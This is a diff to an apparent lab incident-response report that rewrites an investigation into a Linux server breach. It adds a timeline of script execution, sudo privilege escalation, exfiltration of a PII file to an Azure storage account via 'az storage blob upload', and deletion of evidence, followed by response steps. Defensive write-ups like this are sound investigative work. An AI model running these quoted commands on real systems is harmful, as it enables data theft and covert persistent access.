@@ -148,61 +148,107 @@ DeviceNetworkEvents
 
 ### 3. Attack Execution
 
-- Timestamp: Oct 21, 2025 8:00:41 PM (2025-10-22T00:00:41.464697Z)
+- Timestamp: 2025-10-22T00:00:41.464697Z
+  
 - Event: Malicious script executed
+  
 - Command: /bin/bash ./super_secret_script.sh
+  
 - File Path: /home/lab12/super_secret_script.sh
+  
 - Analysis: Attacker initiates automated attack sequence
 
+### 4. Privilege Escalation
+
+- Timestamp: 2025-10-22T00:00:42Z
+  
+- Event: Unauthorized sudo access granted
+  
+- Command: usermod -aG sudo john_bolas
+  
+- User Affected: john_bolas
+  
+- Impact: CRITICAL - Backdoor established for persistent access
+  
+- Analysis: Script grants sudo privileges to compromised user account
+
+### 5. Data Exfiltration
+
+- Timestamp: 2025-10-22T00:00:44.891322Z
+  
+- Event: PII data uploaded to external storage
+  
+- Command: az storage blob upload --account-name chuck --account-key [REDACTED] --container-name chuckcontainer --file /home/lab12/.secret_data1/.pii_file.txt --name test_file
+  
+- Source File: /home/lab12/.secret_data1/.pii_file.txt (hidden PII file)
+  
+- Destination: Azure Storage Account "chuck" / Container "chuckcontainer"
+  
+- Impact: CRITICAL - Sensitive employee PII compromised
+  
+- Analysis: Azure CLI used to transfer sensitive data to attacker-controlled storage
+
+### 6. Cover-Up
+
+- Timestamp: 2025-10-22T00:07:01.760647Z
+  
+- Event: Script and evidence removal
+  
+- Command: xargs rm -f
+  
+- File Path: /home/lab12/super_secret_script.sh (presumed)
+  
+- Analysis: Attacker attempts to cover tracks by forcefully deleting malicious script and related files ~6 minutes post-attack
 
 
+7. Network Confirmation
+
+- Timestamp: 2025-10-22T00:00:45.721694Z
+  
+- Event: Azure storage connection verified
+  
+- Action: ConnectionSuccess to Azure services
+  
+- Analysis: Network logs confirm successful data transmission to Azure Blob Storage
 
 
-### 4. Containment Actions Executed
-
-- Timestamp: 2025-09-30T22:05Z
-
-- Actions:
-
-Disabled account fb4a5b8c3e2f1a9b8c7d6e5f4a3b2c1d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b@******.com
-
-Revoked credentials and active sessions
-
-Management notified
-
-### 5. Post-Incident Review
-
-- Timestamp: 2025-10-02T15:00Z
-
-- Action: Reviewed CLI activity, rotated credentials, and implemented new geo-fencing policies.
  
 
 ---
 
 ## Summary
 
-The Impossible Travel Detection rule in Microsoft Sentinel successfully identified a real account compromise.
-The attacker leveraged valid credentials to access the Azure Portal from geographically distant regions and escalated to command-line access via the Azure CLI.
-
-Findings:
-
-- 1 True Positive (Critical)
-
-- Use of multiple IPs and tools consistent with lateral movement
-
-- Detection logic effective and repeatable
+This investigation confirmed a serious internal security breach on the iclab server. An attacker created and executed a malicious script that first established a persistent backdoor by granting the user john_bolas unauthorized sudo privileges. The script then successfully exfiltrated sensitive PII data to an external Azure storage account. Finally, the attacker attempted to cover their tracks by deleting the script to hide the evidence. 
 
 
 ---
 
 ## Response Taken
 
-- Compromised account disabled immediately
+**Immediate Actions**:
 
-- Tokens revoked and MFA enforced for all service accounts
+- Revoked john_bolas sudo access and credentials
 
-- Management notified of confirmed credential compromise
+- Isolated the iclab server from the network
 
-- Enhanced Sentinel queries and policies deployed to reduce false positives
+- Suspended the compromised account pending management review
+
+**Investigation & Cleanup**:
+
+- Conducted full forensic analysis to confirm script removal
+
+- Audited all user accounts and group memberships across Linux systems
+
+- Restored system from clean, pre-incident backup
+
+**Remediation & Prevention**:
+
+- Rotated all compromised PII and credentials
+
+- Enhanced monitoring for privilege escalation and cloud data transfers
+
+- Initiated additional security awareness training
+
+- Escalated findings to management for further action
 
 ---
